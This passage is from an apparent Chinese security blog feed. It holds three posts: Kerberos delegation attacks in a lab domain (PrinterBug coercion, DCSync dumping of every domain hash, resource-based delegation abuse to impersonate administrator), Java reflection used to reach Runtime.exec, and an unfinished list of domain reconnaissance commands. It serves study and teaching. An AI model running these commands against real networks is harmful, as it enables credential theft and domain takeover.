nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-string">&quot;kerberos::ptt xxx.kiribi&quot;</span><br></code></pre></td></tr></table></figure><p>可以成功访问其他主机</p><p><img src="/images/31.png"></p><h2 id="Print-Bug"><a href="#Print-Bug" class="headerlink" title="Print Bug"></a>Print Bug</h2><p>Rubeus开启监听</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:dc2012$<br></code></pre></td></tr></table></figure><p><img src="/images/33.png"></p><p>printbug.py<br>强制域控访问本机</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> printbug.py doo/user<span class="hljs-number">2</span>:whoami+<span class="hljs-number">123</span>@dc<span class="hljs-number">2012</span> dmwin<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><img src="/images/34.png"></p><p>Rubeus收到base64加密的票据<br><img src="/images/35.png"></p><p>解密票据</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">[IO.File]<span class="hljs-symbol">::WriteAllBytes</span>(<span class="hljs-string">&quot;ticket.kirbi&quot;</span>, [Convert]<span class="hljs-symbol">::FromBase64String</span>(<span class="hljs-string">&quot;...&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="/images/36.png"></p><p>mimikatz导入票据，抓取域控HASH</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">kerberos:<span class="hljs-function">:ptt</span> tickets.kirbi<br>lsadump:<span class="hljs-function">:dcsync</span> <span class="hljs-string">/domain</span><span class="hljs-function">:doo.com</span> <span class="hljs-string">/all</span> <span class="hljs-string">/csv</span><br></code></pre></td></tr></table></figure><p><img src="/images/37.png"></p><h1 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h1><p>查找约束委派的机器</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=doo,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p>查找约束委派的账户</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=doo,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>实验环境：</p><ul><li>DC：dc2012.doo.com</li><li>DM：dmwin10.doo.com</li><li>DM: dmwin7.doo.com</li></ul><p>在DC设置dmwin10的委派信任</p><p><img src="/images/39.png"></p><p>1、使用kekeo/Rubeus进行认证服务器交换获取票据授予票据TGT。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Rubeus</span>.exe asktgt /user:dmwin<span class="hljs-number">10</span>$ /rc<span class="hljs-number">4</span>:f<span class="hljs-number">281</span>c<span class="hljs-number">33</span>cfc<span class="hljs-number">1673</span>d<span class="hljs-number">021</span>df<span class="hljs-number">25553</span>e<span class="hljs-number">379705</span> /outfile:tgt.kirbi<br><br><span class="hljs-attribute">kekeo</span>.exe <span class="hljs-string">&quot;tgt::ask /user:dmwin10$ /domain:doo.com /ntlm:f281c33cfc1673d021df25553e379705&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/images/40.png"></p><p>2、通过约束委派机器账户dmwin10$的TGT来伪造S4U请求，以doo\administrator 的用户身份请求访问 cifs/dmwin7</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kekeo<span class="hljs-selector-class">.exe</span> tgs::s4u /tgt:TGT_dmwin10$@DOO.COM_krbtgt~doo.com@DOO<span class="hljs-selector-class">.COM</span><span class="hljs-selector-class">.kirbi</span> /user:administrator@doo<span class="hljs-selector-class">.com</span> /service:cifs/dmwin7<span class="hljs-selector-class">.doo</span>.com<br></code></pre></td></tr></table></figure><p><img src="/images/41.png"></p><p>3、通过mimikatz/Rubeus导入用于访问cifs/dmwin7.doo.com的TGS即可：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_administrator@doo.com@DOO.COM_cifs~dmwin7.doo.com@DOO.COM.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br>Rubeus.exe ptt /ticket:TGS_administrator@doo.com@DOO.COM_cifs~dmwin7.doo.com@DOO.COM.kirbi<br></code></pre></td></tr></table></figure><p>可以查看dmwin7.doo.com的文件<br><img src="/images/42.png"></p><h1 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h1><p>寻找对目标主机账户有完全控制权限的用户</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Get-DomainUser -Identity user2 -Properties objectsid<br>Get-DomainObjectAcl -Identity dmwin7 | ?&#123;$_.SecurityIdentifier -match &quot;S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1400798338</span><span class="hljs-string">-111303069</span><span class="hljs-string">-2475645031</span><span class="hljs-string">-1107</span>&quot;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/61.png"></p><p>创建机器账户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\Powermad.ps1<br><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> evilsystem <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;evilsystem&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure><p><img src="/images/62.png"></p><p>修改dmwin10的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 这里的 sid -&gt; S-1-5-21-1400798338-111303069-2475645031-1108</span><br><span class="hljs-comment"># 是我们创建的 机器用户 evilsystem 的 sid，在 powerview 下用</span><br><span class="hljs-built_in">Get-DomianComputer</span> hacksystem<br><span class="hljs-comment"># 获取</span><br><br><span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400798338-111303069-2475645031-1108)&quot;</span><br><br><span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)<br><br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">Get-DomainComputer</span> dmwin7| <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/63.png"></p><p>利用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Rubeus</span>.exe hash /user:evilsystem /password:evilsystem /domain:doo.com<br><br><span class="hljs-attribute">Rubeus</span>.exe s<span class="hljs-number">4</span>u /user:evilsystem$ /rc<span class="hljs-number">4</span>:<span class="hljs-number">59</span>E<span class="hljs-number">88</span>FF<span class="hljs-number">5460</span>CD<span class="hljs-number">39</span>F<span class="hljs-number">0</span>FE<span class="hljs-number">4</span>A<span class="hljs-number">9</span>FC<span class="hljs-number">17</span>DAD<span class="hljs-number">53</span>B /impersonateuser:administrator /msdsspn:cifs/dmwin<span class="hljs-number">7</span>.doo.com /ptt<br><span class="hljs-attribute">Rubeus</span>.exe s<span class="hljs-number">4</span>u /user:evilsystem$ /rc<span class="hljs-number">4</span>:<span class="hljs-number">59</span>E<span class="hljs-number">88</span>FF<span class="hljs-number">5460</span>CD<span class="hljs-number">39</span>F<span class="hljs-number">0</span>FE<span class="hljs-number">4</span>A<span class="hljs-number">9</span>FC<span class="hljs-number">17</span>DAD<span class="hljs-number">53</span>B /impersonateuser:administrator /msdsspn:host/dmwin<span class="hljs-number">7</span>.doo.com /ptt<br></code></pre></td></tr></table></figure><p><img src="/images/65.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">getST_windows.<span class="hljs-keyword">exe</span> -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> -spn cifs/dmwin7.doo.<span class="hljs-keyword">com</span> -impersonate administrator doo.<span class="hljs-keyword">com</span>/evilsystem$:evilsystem<br><br><span class="hljs-keyword">set</span> KRB5CCNAME=administrator.ccache<br><br>psexec.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">k</span> dmwin7.doo.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p><img src="/images/64.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要讲述了三种委派方式的原理，并给出了实战利用示例</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>委派</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射机制</title>
    <link href="/2021/06/26/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <url>/2021/06/26/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为对Java Web安全这一块没有做过研究，趁着时间学习一下Java Web安全的知识。</p><p>本文将对Java反射机制做一个简单的讲述。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将讲述以下内容</p><ul><li>Java反射机制</li><li>实验-Java反射机制<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><h2 id="什么是Java反射机制？"><a href="#什么是Java反射机制？" class="headerlink" title="什么是Java反射机制？"></a>什么是Java反射机制？</h2>Java反射机制是一种间接操作目标对象的一种机制。其核心在于JVM在运行的时候再动态加载类。并且对于任意一个类，只要知道它的名称，都能知道它的所有属性和方法。对于任意一个对象，都能调用它的任意方法和属性。<br>Java反射机制是Java动态特性的体现，利用反射机制我们可以轻松实现对Java类的动态调用。<h2 id="Java反射常用类"><a href="#Java反射常用类" class="headerlink" title="Java反射常用类"></a>Java反射常用类</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>lang.Class;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>lang.ClassLoader;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>lang.reflect.Constructor;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>lang.reflect.Field;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>lang.reflect.Method;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>lang.reflect.Modifier;<br></code></pre></td></tr></table></figure><h2 id="Java反射常用方法"><a href="#Java反射常用方法" class="headerlink" title="Java反射常用方法"></a>Java反射常用方法</h2></li></ul><ul><li>forName() 获取类</li><li>newInstance() 初始化类</li><li>getMethod() 获取类的方法</li><li>invoke() 执行类的方法</li></ul><h2 id="Java反射的实现"><a href="#Java反射的实现" class="headerlink" title="Java反射的实现"></a>Java反射的实现</h2><ul><li>Object.getClass() 如：String.getClass()</li><li>Test.class() 如：xxx.class()</li><li>Class.forName 如：class.forName(“java.lang.Runtime”)</li></ul><h1 id="实验-反射调用类方法"><a href="#实验-反射调用类方法" class="headerlink" title="实验 - 反射调用类方法"></a>实验 - 反射调用类方法</h1><h2 id="单例实例"><a href="#单例实例" class="headerlink" title="单例实例"></a>单例实例</h2><p>Runtime类的构造方法是私有的，只能通过单例模式用静态方法获取对象，即我们只能通过Runtime().getRuntime()获取Runtime对象。  </p><p>所以，对Runtime的反射代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;   <br>class1.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>,String.<span class="hljs-params">class</span>)</span>.invoke(class1.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRuntime&quot;</span>)</span>.invoke(class1),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>反射的执行流程如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Class</span> class<span class="hljs-number">1</span> = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);  <br><span class="hljs-attribute">Method</span> method<span class="hljs-number">1</span> = class<span class="hljs-number">1</span>.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br><span class="hljs-attribute">Method</span> method<span class="hljs-number">2</span> = class<span class="hljs-number">1</span>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br><span class="hljs-attribute">Object</span> run = method<span class="hljs-number">2</span>.invoke(class<span class="hljs-number">1</span>);  <br><span class="hljs-attribute">method1</span>.invoke(run,<span class="hljs-string">&quot;calc.exe&quot;</span>);  <br></code></pre></td></tr></table></figure><p>这里对invoke()函数做一点解释：<br>invoke的功能是执行方法，第一个参数根据方法的不同而不同  </p><ul><li>普通方法，则第一个参数为类的对象</li><li>静态方法，则第一个参数为类</li></ul><h2 id="有参构造的反射"><a href="#有参构造的反射" class="headerlink" title="有参构造的反射"></a>有参构造的反射</h2><p>针对有参数的构造函数，需要引入一个新的反射方法getConstructor  </p><p>getConstructor()，参数为目标类的构造函数参数，返回的是目标类的构造函数。  </p><p>因为Runtime的构造方法是私有的，这里用ProcessBuilder来实现</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>)</span>;  <br>class1.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;start&quot;</span>)</span>.invoke(class1.get<span class="hljs-constructor">Constructor(List.<span class="hljs-params">class</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Arrays.<span class="hljs-params">asList</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)</span>));<br></code></pre></td></tr></table></figure><p>用上强制转化的代码（实际环境不一定存在）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>)</span>;  <br>((ProcessBuilder)class1.get<span class="hljs-constructor">Constructor(List.<span class="hljs-params">class</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Arrays.<span class="hljs-params">asList</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)</span>)).start<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><h2 id="私有构造函数"><a href="#私有构造函数" class="headerlink" title="私有构造函数"></a>私有构造函数</h2><p>针对私有构造函数，我们可以通过getDeclared系列的函数进行反射。  </p><p>getDeclaredMethod()可以返回目标类的所有方法，包括私有的方法。  </p><p>这里用Runtime举例（因为它的构造方法是私有的）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;  <br>Constructor a = class1.get<span class="hljs-constructor">DeclaredConstructor()</span>;  <br>a.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;  <br>class1.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(a.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>在这里面新出现了个setAccessible，它的作用是修改私有方法的作用域。获取私有方法后必须修改，否则无法成功调用</p><h1 id="实验-反射调用类成员"><a href="#实验-反射调用类成员" class="headerlink" title="实验 - 反射调用类成员"></a>实验 - 反射调用类成员</h1><h2 id="调用公有变量"><a href="#调用公有变量" class="headerlink" title="调用公有变量"></a>调用公有变量</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;com.javavuln.demo.Person&quot;</span>)</span>;<br>Field f1 = class1.get<span class="hljs-constructor">Field(<span class="hljs-string">&quot;a&quot;</span>)</span>;  <br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(f1.get(class1.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>));<br></code></pre></td></tr></table></figure><h2 id="调用所有变量"><a href="#调用所有变量" class="headerlink" title="调用所有变量"></a>调用所有变量</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;com.javavuln.demo.Person&quot;</span>)</span>;<br>Field f1 = class1.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;b&quot;</span>)</span>;<br>f1.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(f1.get(class1.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>));<br></code></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文讲述了Java的反射机制，并对各种情况下的反射进行试验</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[<a href="https://javasec.org/javase/Reflection/Reflection.html]">https://javasec.org/javase/Reflection/Reflection.html]</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之信息收集</title>
    <link href="/2020/06/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2020/06/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进入内网，我们需要解决三个问题</p><ul><li>我是谁？</li><li>这是哪？</li><li>我在哪？<br>因此，内网的信息收集是内网渗透必不可少的一环<span id="more"></span></li></ul><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将讲述以下内容</p><ul><li>用户信息</li><li>网络信息</li><li>主机信息</li><li>权限信息</li><li>判断域</li><li>域内信息</li><li>域控信息</li><li>域内用户和管理员信息</li></ul><h1 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h1><h2 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h2><p><code>net user</code></p><h2 id="查询本地管理员信息"><a href="#查询本地管理员信息" class="headerlink" title="查询本地管理员信息"></a>查询本地管理员信息</h2><p><code>net localgroup administrators</code></p><h2 id="查询当前在线用户"><a href="#查询当前在线用户" class="headerlink" title="查询当前在线用户"></a>查询当前在线用户</h2><p><code>query  user || qwinsta</code></p><h2 id="查询会话"><a href="#查询会话" class="headerlink" title="查询会话"></a>查询会话</h2><p><code>net session</code></p><h1 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h1><h2 id="查看本机网络配置"><a href="#查看本机网络配置" class="headerlink" title="查看本机网络配置"></a>查看本机网络配置</h2><p><code>ipconfig /all</code></p><h2 id="查看arp缓存"><a href="#查看arp缓存" class="headerlink" title="查看arp缓存"></a>查看arp缓存</h2><p><code>arp -a</code></p><h2 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h2><p><code>route print</code></p><h2 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h2><p><code>netstat -ano</code></p><h1 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h1><h2 id="主机版本"><a href="#主机版本" class="headerlink" title="主机版本"></a>主机版本</h2><p><code>systeminfo | findstr /b /c:&quot;OS Name&quot; /c:&quot;OS Version&quot;</code><br>中文版则如下：<br>systeminfo | findstr /b /c:”OS 名称” /c:”OS 版本”</p><h2 id="系统体系结构"><a href="#系统体系结构" class="headerlink" title="系统体系结构"></a>系统体系结构</h2><p><code>echo %processor_architecture%</code></p><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>使用wmic：<br><code>wmic product get name,version</code><br>使用PowerShell：<br><code>powershell &quot;get-wmiobject -class win32_product | select-object -property name,version&quot;</code></p><h2 id="杀软信息"><a href="#杀软信息" class="headerlink" title="杀软信息"></a>杀软信息</h2><p><code>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct get /format:LIST</code></p><h2 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h2><p><code>wmic service list brief</code></p><h2 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h2><p><code>tasklist /svc</code><br>或<br><code>wmic process list brief</code></p><h2 id="系统自启动项"><a href="#系统自启动项" class="headerlink" title="系统自启动项"></a>系统自启动项</h2><p><code>wmic startup get command,caption</code></p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p><code>schtask /query /fo /list /v</code></p><h2 id="开机时长"><a href="#开机时长" class="headerlink" title="开机时长"></a>开机时长</h2><p><code>net statistics workstation</code></p><h2 id="系统补丁"><a href="#系统补丁" class="headerlink" title="系统补丁"></a>系统补丁</h2><p><code>systeminfo</code><br>或<br><code>wmic qfe get caption,description,hotfixid,installedon</code></p><h2 id="共享列表"><a href="#共享列表" class="headerlink" title="共享列表"></a>共享列表</h2><p><code>net share</code><br>或<br><code>wmic share get name,path,status</code></p><h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><p><code>netsh firewall show config</code></p><h2 id="远程连接端口"><a href="#远程连接端口" class="headerlink" title="远程连接端口"></a>远程连接端口</h2><p><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p><code>reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVER CLIENT\DEFAULT&quot;</code></p><h1 id="权限信息"><a href="#权限信息" class="headerlink" title="权限信息"></a>权限信息</h1><h2 id="当前权限"><a href="#当前权限" class="headerlink" title="当前权限"></a>当前权限</h2><p><code>whoami</code></p><h2 id="获取SID"><a href="#获取SID" class="headerlink" title="获取SID"></a>获取SID</h2><p><code>whoami /all</code></p><h2 id="获取用户详细信息"><a href="#获取用户详细信息" class="headerlink" title="获取用户详细信息"></a>获取用户详细信息</h2><p><code>net user xxx /domain</code></p><h1 id="判断域"><a href="#判断域" class="headerlink" title="判断域"></a>判断域</h1><p>当一台主机不清楚是否入域，我们可以通过以下方式判断</p><h2 id="net命令"><a href="#net命令" class="headerlink" title="net命令"></a>net命令</h2><p><code>net user /domain</code></p><h2 id="ipconfig命令"><a href="#ipconfig命令" class="headerlink" title="ipconfig命令"></a>ipconfig命令</h2><p>首先通过<code>ipconfig</code>获取IP信息<br>再通过<code>nslookup</code>反向解析查询IP地址，由此判断DNS服务器和域控是否在一台服务器上</p><h2 id="查看系统详细情况"><a href="#查看系统详细情况" class="headerlink" title="查看系统详细情况"></a>查看系统详细情况</h2><p>在系统详细信息里，会存有当前系统是否入域的情况<br><code>systeminfo | findstr /C:&quot;Domain&quot;</code></p><h2 id="查询当前登录域及登录情况"><a href="#查询当前登录域及登录情况" class="headerlink" title="查询当前登录域及登录情况"></a>查询当前登录域及登录情况</h2><p><code>net config workstation</code></p><h2 id="时间服务器判断主域"><a href="#时间服务器判断主域" class="headerlink" title="时间服务器判断主域"></a>时间服务器判断主域</h2><p>域控服务器通常也被当作时间服务器来使用，因此我们可以通过以下命令判断主域<br><code>net time /domain</code><br>根据结果不同来判断当前用户情况</p><ul><li>发生系统错误：存在域，但当前用户不是域用户</li><li>返回时间：存在域且当前用户为域用户</li><li>返回WORKGROUP：网络环境为工作组，不存在域</li></ul><h1 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h1><p>已经确认主机已入域，可以通过下面命令收集信息</p><h2 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h2><p><code>net view /domain</code>或<code>net user /domain</code></p><h2 id="查询域内机器"><a href="#查询域内机器" class="headerlink" title="查询域内机器"></a>查询域内机器</h2><p><code>net view /domain:xxx</code></p><h2 id="查询域用户组"><a href="#查询域用户组" class="headerlink" title="查询域用户组"></a>查询域用户组</h2><p><code>net group /domain</code></p><h2 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h2><p><code>net group &quot;domain computers&quot; /domain</code></p><h2 id="获取密码策略"><a href="#获取密码策略" class="headerlink" 